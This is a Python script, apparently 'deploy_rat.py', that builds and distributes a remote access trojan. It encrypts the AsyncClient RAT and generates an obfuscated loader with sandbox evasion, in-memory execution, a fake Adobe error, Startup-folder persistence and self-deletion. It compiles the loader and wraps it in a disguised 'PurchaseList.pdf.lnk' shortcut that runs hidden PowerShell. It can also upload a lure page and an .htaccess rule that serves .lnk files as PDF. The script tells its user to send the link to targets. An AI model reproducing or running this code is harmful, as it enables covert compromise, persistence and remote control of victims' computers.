import base64
import configparser
import logging
import random
import socket
import ssl
import string
import subprocess
import sys
import time
import traceback
from pathlib import Path
from typing import List, Optional, Tuple, Typedict
from cryptography.fernet import Fernet
import argparse
import shutil
import win32com.client
from win32com.shell import shell
import os
import ctypes # Import ctypes for MessageBoxW

# --- Logging Setup ---
# Configure basic logging to both a file and the console.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(module)s:%(lineno)d - %(message)s',
    handlers=[
        logging.FileHandler('rat_deployment.log'), # Log messages to a file
        logging.StreamHandler() # Also log messages to the console
    ]
)
logger = logging.getLogger(__name__)

# --- Configuration Type Definition ---
class ServerConfig(TypedDict):
    """Type definition for server configuration, ensuring clear structure for server details."""
    host: str
    port: str
    username: str
    password: str
    remote_dir: str
    url_base: str

# --- RAT Deployment Class ---
class RATDeployer:
    """
    Manages the automated deployment of a pre-configured RAT (AsyncClient.exe)
    via a stealthy LNK file. This class handles encryption, loader creation,
    obfuscation, executable generation, LNK file creation, and optional server upload.
    """

    def __init__(self, rat_path: str, upload: bool = False, config_path: str = "config.ini", log_level: str = "INFO"):
        """
        Initializes the RATDeployer.

        Args:
            rat_path: Path to the AsyncClient.exe RAT executable.
            upload: If True, files will be uploaded to an HTTPS server.
            config_path: Path to the configuration file (e.g., config.ini) for server settings.
            log_level: Sets the logging verbosity (e.g., "INFO", "DEBUG").
        """
        self.rat_path = Path(rat_path)
        self.upload = upload
        self.config = self._load_config(config_path)

        # Define output directories for generated files
        self.base_dir = Path("rat_deployment")
        self.output_dir = self.base_dir / "output"
        self.output_dir.mkdir(parents=True, exist_ok=True) # Ensure output directory exists

        # Generate random names for the LNK and executable files for stealth
        self.lnk_name = f"{self._random_string(6)}_PurchaseList.pdf.lnk"
        self.exe_name = f"helper_{self._random_string(8)}.exe"
        self.files: List[Path] = [] # List to keep track of generated files for deployment

        # Set the logging level based on the input argument
        logging.getLogger().setLevel(getattr(logging, log_level.upper(), logging.INFO))

    def _random_string(self, length: int = 8) -> str:
        """
        Generates a random alphanumeric string of a specified length.
        Used for creating unique file names.
        """
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

    def _load_config(self, config_path: str) -> ServerConfig:
        """
        Loads server configuration from a `config.ini` file or environment variables.
        Prioritizes file configuration if available.
        """
        config = configparser.ConfigParser()
        if Path(config_path).exists():
            config.read(config_path)
        else:
            # Fallback to environment variables if config file is not found
            config['Server'] = {
                'host': os.environ.get('RAT_HOST', ''),
                'port': os.environ.get('RAT_PORT', '8443'),
                'username': os.environ.get('RAT_USERNAME', ''),
                'password': os.environ.get('RAT_PASSWORD', ''),
                'remote_dir': os.environ.get('RAT_REMOTE_DIR', '/var/www/html'),
                'url_base': os.environ.get('RAT_URL_BASE', '')
            }
        server_config: ServerConfig = config['Server']
        # Validate configuration if upload is enabled
        if self.upload and not all(server_config.values()):
            raise ValueError("Incomplete server configuration for upload. Please provide all required server details.")
        return server_config

    def generate_payload(self) -> Tuple[str, str]:
        """
        Reads the RAT executable, encrypts it using Fernet, and generates an encryption key.
        The encrypted payload and key are returned in base64-encoded format.
        """
        logger.debug(f"Reading RAT file: {self.rat_path}")
        try:
            payload = self.rat_path.read_bytes()
            if not payload:
                raise ValueError("Empty RAT payload. The RAT file might be corrupted or empty.")

            # Retry key generation up to 3 times to ensure a valid key is created
            for _ in range(3):
                try:
                    key = Fernet.generate_key()
                    fernet = Fernet(key)
                    encrypted = fernet.encrypt(payload)
                    encoded = base64.b64encode(encrypted).decode()
                    logger.info(f"Payload encrypted successfully, size: {len(encoded)} bytes")
                    return encoded, base64.b64encode(key).decode()
                except (ValueError, Fernet.InvalidToken) as e:
                    logger.warning(f"Key generation failed: {str(e)}. Retrying...")
                    time.sleep(1) # Wait a bit before retrying
            raise ValueError("Failed to generate a valid encryption key after multiple attempts.")
        except FileNotFoundError:
            logger.error(f"RAT file not found at: {self.rat_path}\n{traceback.format_exc()}")
            raise
        except Exception as e:
            logger.error(f"Payload encryption failed: {str(e)}\n{traceback.format_exc()}")
            raise

    def create_loader_script(self, encoded_payload: str, key_b64: str) -> Path:
        """
        Creates a polymorphic Python loader script. This script includes anti-sandbox checks,
        in-memory execution of the decrypted RAT, persistence mechanisms, and self-destruction.
        Random function names and junk code are added for obfuscation.
        """
        logger.debug("Generating polymorphic loader script...")
        try:
            # Randomize function names to make analysis harder
            func_names = {
                'is_sandbox': self._random_string(10),
                'execute_in_memory': self._random_string(10),
                'persist': self._random_string(10),
                'self_destruct': self._random_string(10),
            }
            # Generate random junk code patterns to insert into the script
            junk_patterns = [
                f"def {self._random_string()}(x): return x * {random.randint(1, 10)}\n",
                f"{self._random_string()} = [{random.randint(1, 100)} for _ in range({random.randint(3, 10)})]\n",
                f"if {random.randint(0, 1)}: {self._random_string()} = {self._random_string()}\n"
            ]
            junk_code = ''.join(random.choice(junk_patterns) for _ in range(random.randint(2, 5)))

            # Define the core functionalities as separate code blocks
            code_blocks = [
                f"""
def {func_names['is_sandbox']}():
    # Perform checks to detect if running in a sandbox or debugger environment.
    try:
        import winreg
        # Check for VMware artifacts in registry
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
        if "vmware" in winreg.EnumValue(key, 0)[1].lower():
            return True
        # Check for common debugger DLLs or environment variables
        if os.path.exists("C:\\\\Windows\\\\SysWOW64\\\\ntdll.dll") and "debugger" in os.environ.get("PATH", "").lower():
            return True
        # Check for known analysis tools
        for proc in ['wireshark.exe', 'ollydbg.exe']:
            if os.path.exists(f"C:\\\\Program Files\\\\{{proc}}") or os.path.exists(f"C:\\\\Program Files (x86)\\\\{{proc}}"):
                return True
    except:
        pass # Suppress errors to avoid detection
    return False
""",
                f"""
def {func_names['execute_in_memory']}():
    # Executes the decrypted RAT payload directly in memory.
    # Includes an anti-analysis check before execution.
    if {func_names['is_sandbox']}():
        sys.exit(0) # Exit if sandbox environment is detected

    try:
        # Decode the encryption key and payload
        key = base64.b64decode("{key_b64}")
        fernet = Fernet(key)
        encrypted = base64.b64decode("{encoded_payload}")
        payload = fernet.decrypt(encrypted)

        # Allocate memory, move payload, and execute
        import ctypes
        kernel32 = ctypes.WinDLL('kernel32')
        # VirtualAlloc: allocates memory in the virtual address space of the calling process
        mem = kernel32.VirtualAlloc(None, len(payload), 0x1000 | 0x2000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        # memmove: copies bytes from source to destination
        ctypes.memmove(mem, payload, len(payload))
        # Cast the memory address to a callable function pointer and execute
        ctypes.cast(mem, ctypes.CFUNCTYPE(None))()

        # Display a fake error message after the payload has executed
        ctypes.windll.user32.MessageBoxW(0, "The file is corrupted and cannot be opened.", "Adobe Reader", 0x10)

        # Ensure persistence and self-destruct after execution
        {func_names['persist']}()
        {func_names['self_destruct']}()
    except Exception:
        pass # Suppress any errors during execution to maintain stealth
""",
                f"""
def {func_names['persist']}():
    # Establishes persistence by copying the executable to the Windows Startup folder.
    try:
        import shutil
        startup_path = os.path.expandvars(r'%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe')
        shutil.copy(sys.executable, startup_path)
    except:
        pass # Suppress errors for stealth
""",
                f"""
def {func_names['self_destruct']}():
    # Schedules the executable for self-destruction after a delay.
    try:
        # Use cmd.exe with timeout to delete the current executable
        subprocess.Popen('cmd.exe /c timeout 3600 & del "%~f0"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass # Suppress errors for stealth
    os._exit(0) # Forcefully exit the process
"""
            ]
            random.shuffle(code_blocks) # Randomize the order of code blocks

            # Assemble the final loader script
            loader_script = f"""
import base64
from cryptography.fernet import Fernet
import os
import sys
import ctypes # Required for in-memory execution and MessageBoxW

{junk_code} # Insert random junk code
{''.join(code_blocks)} # Include all core functional blocks

if __name__ == "__main__":
    {func_names['execute_in_memory']}() # Start the in-memory execution process
"""
            # Save the generated script
            script_path = self.base_dir / "loaders" / "obfuscated_loader.py"
            script_path.parent.mkdir(parents=True, exist_ok=True)
            script_path.write_text(loader_script)
            logger.info(f"Loader script generated at {script_path}")
            return script_path
        except (ValueError, MemoryError) as e:
            logger.error(f"Loader script generation failed: {str(e)}\n{traceback.format_exc()}")
            raise

    def obfuscate_script(self, script_path: Path) -> Path:
        """
        Obfuscates the generated loader script using PyArmor to hinder analysis.
        """
        logger.debug(f"Obfuscating script: {script_path} with PyArmor...")
        try:
            output_dir = self.base_dir / "obf"
            # Execute PyArmor command
            subprocess.run(
                ['pyarmor', 'obfuscate', '--recursive', '--output', str(output_dir), str(script_path)],
                check=True, # Raise an exception if the command fails
                capture_output=True,
                text=True
            )
            obfuscated_path = output_dir / script_path.name
            logger.info(f"Script obfuscated successfully at {obfuscated_path}")
            return obfuscated_path
        except subprocess.CalledProcessError as e:
            logger.error(f"PyArmor obfuscation failed: {e.stderr}\n{traceback.format_exc()}")
            raise

    def create_executable(self, script_path: Path, final_exe_name: str) -> Path:
        """
        Converts the obfuscated Python script into a standalone Windows executable
        using PyInstaller and then compresses it with UPX.
        """
        logger.debug(f"Creating executable from {script_path} using PyInstaller...")
        exe_path = self.output_dir / final_exe_name
        for attempt in range(3): # Retry executable creation up to 3 times
            try:
                # Run PyInstaller to create the executable
                subprocess.run(
                    ['pyinstaller', '--onefile', '--noconsole', str(script_path)],
                    check=True,
                    capture_output=True,
                    text=True
                )
                temp_exe = Path('dist') / 'obfuscated_loader.exe'
                if temp_exe.exists():
                    # Compress the executable with UPX for smaller size and added obfuscation
                    subprocess.run(['upx', '--best', str(temp_exe)], check=False) # Don't raise error if UPX fails
                    shutil.move(temp_exe, exe_path) # Move the final executable to the output directory
                logger.info(f"Executable created and compressed at {exe_path}")
                return exe_path
            except subprocess.CalledProcessError as e:
                logger.warning(f"PyInstaller attempt {attempt + 1} failed: {e.stderr}. Retrying...")
                time.sleep(1)
        raise RuntimeError("Failed to create executable after 3 attempts.")

    def create_lnk_file(self, loader_exe_path: Path, lnk_name: str) -> Path:
        """
        Creates a stealthy .lnk (shortcut) file that executes the loader executable.
        The LNK file uses Powershell to hide the console window.
        """
        logger.debug(f"Creating LNK file for {loader_exe_path}...")
        try:
            shell_obj = win32com.client.Dispatch("WScript.Shell")
            lnk_path = self.output_dir / lnk_name
            shortcut = shell_obj.CreateShortCut(str(lnk_path))

            # Configure the shortcut to run Powershell, which then invisibly starts the executable
            shortcut.Targetpath = "powershell.exe"
            shortcut.Arguments = f'-WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process \'{loader_exe_path}\' -WindowStyle Hidden"'
            shortcut.IconLocation = r"%SystemRoot%\system32\imageres.dll,44" # Set a legitimate-looking icon
            shortcut.WindowStyle = 7 # Minimize window on launch
            shortcut.Save()

            # Hide the loader executable file to further increase stealth
            subprocess.run(['attrib', '+H', str(loader_exe_path)], check=True)
            logger.info(f"LNK file created at {lnk_path} with hidden loader executable.")
            return lnk_path
        except Exception as e:
            logger.error(f"LNK file creation failed: {str(e)}\n{traceback.format_exc()}")
            raise RuntimeError(f"Failed to create LNK file: {str(e)}")

    def upload_to_server(self, files: List[Path], config: ServerConfig) -> str:
        """
        Uploads the generated LNK file and executable to a specified HTTPS server
        using a secure socket connection. Also uploads a deceptive HTML page and .htaccess.
        """
        logger.debug(f"Attempting to upload files to {config['host']}:{config['port']}...")
        try:
            context = ssl.create_default_context() # Create a default SSL context for secure connection
            host, port = config['host'], int(config['port'])

            # Upload the LNK and executable files
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    for file_path in files:
                        file_name = file_path.name
                        data = file_path.read_bytes()
                        header = f"FILE:{file_name}:{len(data)}\n".encode()
                        ssock.send(header)
                        ssock.send(data)
                        logger.info(f"Uploaded {file_name} to {config['remote_dir']}/{file_name}")

            # Generate and upload a deceptive HTML page
            html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Company Downloads</title>
</head>
<body>
    <h1>Company Downloads</h1>
    <a href="{config['url_base']}/{files[0].name}">Download Purchase List</a>
    <p>Click to download the purchase list PDF.</p>
</body>
</html>
"""
            html_path = self.output_dir / 'index.html'
            html_path.write_text(html_content)
            data = html_path.read_bytes()
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    header = f"FILE:index.html:{len(data)}\n".encode()
                    ssock.send(header)
                    ssock.send(data)
            html_path.unlink() # Clean up the temporary HTML file

            # Generate and upload a .htaccess file for LNK file handling
            htaccess_content = "AddType application/pdf .lnk\n" # Treat .lnk as PDF to bypass some filters
            htaccess_path = self.output_dir / '.htaccess'
            htaccess_path.write_text(htaccess_content)
            data = htaccess_path.read_bytes()
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    header = f"FILE:.htaccess:{len(data)}\n".encode()
                    ssock.send(header)
                    ssock.send(data)
            htaccess_path.unlink() # Clean up the temporary .htaccess file

            logger.info("Uploaded index.html and .htaccess to server.")
            return f"{config['url_base']}/index.html" # Return the URL to the deployed HTML page
        except (socket.gaierror, ssl.SSLError, OSError) as e:
            logger.error(f"Socket upload failed: {str(e)}\n{traceback.format_exc()}")
            raise RuntimeError(f"Failed to upload files: {str(e)}")

    def deploy(self) -> None:
        """
        Executes the full deployment process: generating payload, creating loader,
        obfuscating, building executable, and creating LNK file.
        """
        logger.info("Starting RAT deployment process...")
        encoded_payload, key_b64 = self.generate_payload()
        script_path = self.create_loader_script(encoded_payload, key_b64)
        obfuscated_script_path = self.obfuscate_script(script_path)
        exe_path = self.create_executable(obfuscated_script_path, self.exe_name)
        lnk_path = self.create_lnk_file(exe_path, self.lnk_name)
        self.files = [lnk_path, exe_path] # Store paths to the generated files
        logger.info("RAT deployment completed successfully.")

    def run(self, host: Optional[str], port: int, username: Optional[str], password: Optional[str], remote_dir: str, url_base: Optional[str]) -> None:
        """
        Orchestrates the deployment and optional upload process based on user arguments.
        """
        self.deploy() # Perform the local deployment steps

        if self.upload:
            # Update configuration with command-line arguments if provided
            config = self.config
            if host: config['host'] = host
            if username: config['username'] = username
            if password: config['password'] = password
            if remote_dir: config['remote_dir'] = remote_dir
            if url_base: config['url_base'] = url_base

            # Upload the generated files to the server
            deployed_url = self.upload_to_server(self.files, config)
            print(f"Deployment successful! Files uploaded to: {deployed_url}")
            print("Distribute this URL to targets. Clicking the link downloads the stealthy shortcut.")
        else:
            print(f"Local deployment complete. Stealthy shortcut created: {self.lnk_name}")
            print(f"Loader executable: {self.exe_name}")
            print("\nNext steps for manual deployment:")
            print("1. Upload both the shortcut file (e.g., PurchaseList.pdf.lnk) and the loader executable (e.g., helper_xxxx.exe) to an HTTPS server in the same directory.")
            print("2. Create an HTTPS webpage with a link to the LNK file. For example:")
            print(f"   <a href='https://yourserver.com/{self.lnk_name}'>Download Purchase List</a>")
            print("When clicked, the shortcut will silently run the RAT in memory with persistence.")

# --- Main Execution Block ---
def main() -> None:
    """
    Parses command-line arguments and initiates the RAT deployment process.
    Handles exceptions and ensures cleanup of temporary files.
    """
    parser = argparse.ArgumentParser(
        description="Deploy a pre-configured AsyncClient.exe (RAT) via a stealthy LNK file with one command.",
        epilog="""Examples:
  Local deployment:
    python deploy_rat.py AsyncClient.exe
  Deploy with upload (using config.ini for server details):
    python deploy_rat.py AsyncClient.exe --upload
  Run in debug mode for detailed logging:
    python deploy_rat.py AsyncClient.exe --log-level DEBUG
  Override config.ini settings directly via command-line for upload:
    python deploy_rat.py AsyncClient.exe --upload --host yourserver.com --username user --password pass --url-base https://yourserver.com
"""
    )
    # Define command-line arguments
    parser.add_argument("rat_path", help="Path to AsyncClient.exe (the pre-configured RAT executable)")
    parser.add_argument("--upload", action="store_true", help="Enable uploading of files to an HTTPS server")
    parser.add_argument("--host", help="Server hostname (e.g., yourserver.com) for file uploads")
    parser.add_argument("--port", type=int, default=8443, help="Server port for secure socket connection (default: 8443)")
    parser.add_argument("--username", help="Username for server authentication (if required for upload)")
    parser.add_argument("--password", help="Password for server authentication (if required for upload)")
    parser.add_argument("--remote-dir", default="/var/www/html", help="Remote directory on the server for uploads (default: /var/www/html)")
    parser.add_argument("--url-base", help="Base URL for the server where files will be hosted (e.g., https://yourserver.com)")
    parser.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR"],
                        help="Set the logging level (default: INFO)")

    args = parser.parse_args()

    try:
        # Initialize and run the deployer
        deployer = RATDeployer(args.rat_path, args.upload, log_level=args.log_level)
        deployer.run(args.host, args.port, args.username, args.password, args.remote_dir, args.url_base)
    except Exception as e:
        logger.error(f"Deployment failed: {str(e)}\n{traceback.format_exc()}")
        print(f"Error: {str(e)}")
        print("Please check rat_deployment.log for more detailed information.")
        sys.exit(1) # Exit with an error code
    finally:
        # Clean up temporary directories and files created during the process
        for directory in [Path('build'), Path('dist'), Path('obf'), Path('rat_deployment') / 'loaders']:
            if directory.exists():
                shutil.rmtree(directory, ignore_errors=True) # Remove directory and its contents
        for file_to_delete in [Path('obfuscated_loader.py'), Path('obfuscated_loader.py.spec')]:
            if file_to_delete.exists():
                file_to_delete.unlink(missing_ok=True) # Delete file if it exists

if __name__ == "__main__":
    main()
